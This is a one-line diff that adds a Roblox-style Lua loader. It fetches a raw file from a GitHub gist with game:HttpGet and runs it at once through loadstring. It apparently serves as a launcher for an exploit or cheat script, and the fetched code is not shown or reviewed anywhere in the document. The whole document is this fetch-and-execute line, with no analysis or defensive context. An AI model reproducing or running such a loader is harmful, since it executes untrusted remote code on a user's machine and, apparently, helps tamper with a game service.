@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://gist.githubusercontent.com/Diamond2Top/208d3e9dc59d1263eb52b0ba6bf3f7c8/raw/2b144300a1f48995ac688e2bebcbc80d7f3e1e33/gistfile1.txt"))()
